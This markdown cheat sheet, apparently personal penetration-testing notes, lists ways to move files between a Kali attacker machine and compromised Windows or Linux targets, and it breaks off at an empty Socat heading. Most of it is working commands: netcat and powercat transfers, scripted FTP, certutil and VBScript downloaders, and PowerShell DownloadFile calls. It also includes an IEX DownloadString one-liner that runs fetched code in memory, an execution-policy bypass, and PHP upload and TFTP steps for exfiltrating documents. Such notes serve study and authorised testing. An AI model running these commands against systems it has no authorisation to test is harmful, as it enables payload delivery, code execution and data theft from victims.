---
title: "File transfers"
author: "Me"
date: "February 25, 2022"
output: html_document
---

# File transfers
{:.no_toc}

1. TOC
{:toc}
{:style="color:black; font-size: 150%;"}


## Netcat
Netcat can transfer files in both text and binary. It is simple to use but not always installed on the target.\\

````
nc -nlvp 4444 > incoming.txt                  // Receiving end
nc -nv <target IP> 4444 < <path to file>      // Sending end
````



## FTP
As netcat, FTP can transfer files in both text and binary. Depending on the transfer direction, it may be necessary to install Pure-FTPd on Kali (sudo apt update && sudo apt install pure-ftpd, then create a new user).

````
binary                // Optional: switch to binary mode
put <filename>        // Upload a file on the server
get <filename>        // Downloads a file from the server
`````

We can also use FTP's *-s* flag, which allows us to specify a text file containing FTP commands that will be executed automatically when FTP starts.
- Set up an FTP server on Kali 
- Place the file to transfer (in this example _nc.exe_) in /ftphome directory.
- On Windows, create a _ftp.txt_ file containing the commands to execute (transfer the file in binary mode):

````
echo open <Kali IP> 21> ftp.txt
echo USER <FTP username>>> ftp.txt
echo <FTP password>>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
`````

- Download the file from Windows: 

```
ftp -v -n -s:ftp.txt
````

In the previous command, *-v* is used to suppress any returned output, *-n* to suppress automatic login, *-s* to specify the file.



## HTTP
Often used to serve a file from Kali and download it to the target machine.\\
Start a web server on Kali (Python or Apache) and download the file from the compromised machine:

````
sudo python -m SimpleHTTPServer                                      // Starts a web server on port 8000 by default
sudo service Apache2 restart                                         // Starts an Apache web server
wget http://<kali_IP>:<port>/<file>                                  // Downloads the file from a Linux machine
certutil.exe -urlcache -split -f http://<kali_IP>:<port>/<file>      // Downloads the file from a Windows machine
`````
Python web root directory is the directory in which the command was issued, whereas Apache's web root directory is always */var/www/*.



## VBScript
We can issue the following commands into a remote shell to write out a _wget.vbs_ script that acts as a HTTP downloader:
`````
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wge
t.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.
vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
``````
We can then run this script from Windows to download a file on Kali:
````
cscript wget.vbs http://<Kali IP>/<File to download> <Name of the downloaded file>
`````



## Powershell
PowerShell can be used to transfer files between Kali and Windows in both directions.\\
**Kali -> Windows** (start a web server on Kali):

Create a Powershell downloader script (*wget.ps1*) on the Windows machine:
````
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://<Kali IP>/<File to download>" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
`````
Run the script:
````
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
````
The execution of powershell scripts is restricted by default, so we allow it with _-ExecutionPolicy Bypass_.

Alternative one-liners:
````
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<Kali IP>/<File to download>', '<Name of the downloaded file>')
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<Kali IP>/<File to download>','C:\<Path of the downloaded file>')"
````

Download without saving the file to disk:
````
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://<Kali IP>/<File to download>')
````

**Windows -> Kali** (WARNING: this allows anyone to upload files on Kali)

Create the following PHP script on Kali and save it as _upload.php_ in the webroot directory (_/var/www/html_):

````
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
````

This code processes an incoming file upload request (POST) and save the transferred data to _/var/www/uploads/_. 
Before using it, we create the _uploads_ folder and grant the _www_data_ user ownership and write permissions (check status as well):

````
sudo mkdir /var/www/uploads
ps -ef | grep apache
sudo chown www-data: /var/www/uploads
ls -al
````

From Windows, invoke the _UploadFile_ method from the _System.Net.WebClient_ class to upload the document we want to exfiltrate:

````
powershell (New-Object System.Net.WebClient).UploadFile('http://<Kali IP>/upload.php', '<Doc to exfil')
`````



## Exe2hex
Compress and transfer files. Example to transfer nc.exe from Kali to Windows:

````
upx -9 nc.exe                   // Compress the file with upx
exe2hex -x nc.exe -p nc.cmd     // Convert the file to a Windows script (.cmd) with exe2hex
````
Copy the script (we can copy it to the clipboard with _cat nc.cmd | xclip -selection clipboard_) and paste it in the remote shell. This will automatically transfer the hex file on Windows and convert it back to binary (at the end of the script, there are commands which rebuild the _nc.exe_ executable on the target).



## Certutil
Reliable and often installed tool on Windows machines:

````
certutil.exe -urlcache -split -f http://<Kali IP>/<File to download> <Name of the downloaded file>
certutil.exe -verifyctl -f -split http://<Kali IP>/<File to download> <Name of the downloaded file>
`````



## SMB
Start a server on Kali/Linux host, and copy the file to the created share (use backslashes and double backslashes in front of Kali's IP in the command below):

````
sudo impacket-smbserver <sharename> .                           // Receiving end
copy <path to file> \\<kali IP>\<sharename>\<filename>          // Sending end
`````



## Powercat
Similar to Netcat. It may be necessary to transfer powercat to the target machine beforehand.

````
sudo nc -nlvp 443 > <name of the object that will be received>        // Receiving end
powercat -c <Kali IP> -p 443 -i C:\<path of the object to transfer>   // Sending end
````
In this command, _-c_ specifies the client mode and sets the listening address, _-i_ indicates the local file to transfer.



## TFTP 
TFTP is a UDP-based file transfer protocol.
Rarely works (often restricted by egress firewall rules), but can come handy in certain situations. 
For example, it can be used on older systems if PowerShell isn't installed.

- Install and configure a TFTP server on Kali/Linux (receiving end):

````
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
````

- On the sending end, run the TFTP client with _-i_ to specify a binary image transfer:

````
tftp -i <Kali IP> put <Doc to exfil>
````

## Socat
...
  




